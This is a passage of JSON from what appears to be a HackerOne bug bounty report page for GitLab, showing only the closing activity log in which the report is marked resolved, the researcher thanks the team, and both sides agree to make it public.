regards,\u003cbr\u003e\nJames\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-18T18:23:43.568Z","updated_at":"2018-07-18T18:23:43.568Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3063256,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Closing as resolved","markdown_message":"\u003cp\u003eClosing as resolved\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-18T18:24:08.554Z","updated_at":"2018-07-18T18:24:08.554Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"saltyyolk","url":"/saltyyolk"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3064235,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Looks great. Thank you.","markdown_message":"\u003cp\u003eLooks great. Thank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-19T00:42:45.206Z","updated_at":"2018-07-19T00:42:45.206Z","actor":{"username":"saltyyolk","cleared":false,"url":"/saltyyolk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/252/596/b03010470e2928f744f71fb5c1685806f1878341_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3217511,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi @jritchey \n\nSince It has been 1 month since you released a fix for it. Let's disclose this report. :)","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jritchey\"\u003e@jritchey\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eSince It has been 1 month since you released a fix for it. Let\u0026#39;s disclose this report. :)\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-19T15:29:36.533Z","updated_at":"2018-08-19T15:29:36.533Z","first_to_agree":true,"actor":{"username":"saltyyolk","cleared":false,"url":"/saltyyolk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/252/596/b03010470e2928f744f71fb5c1685806f1878341_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3230308,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@nyangawa ,\n\nAbsolutely, I've set https://gitlab.com/gitlab-org/gitlab-ce/issues/49133 to public. Let's set the H1 report to public as well.\n\nBest regards,\nJames","markdown_message":"\u003cp\u003e\u003ca href=\"/nyangawa\"\u003e@nyangawa\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eAbsolutely, I\u0026#39;ve set \u003ca title=\"https://gitlab.com/gitlab-org/gitlab-ce/issues/49133\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-ce%2Fissues%2F49133\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab-ce/issues/49133\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to public. Let\u0026#39;s set the H1 report to public as well.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJames\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-22T09:55:13.269Z","updated_at":"2018-08-22T09:55:13.269Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3230311,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Setting to public.","markdown_message":"\u003cp\u003eSetting to public.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-22T09:56:02.225Z","updated_at":"2018-08-22T09:56:02.225Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3230312,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-22T09:56:02.449Z","updated_at":"2018-08-22T09:56:02.449Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}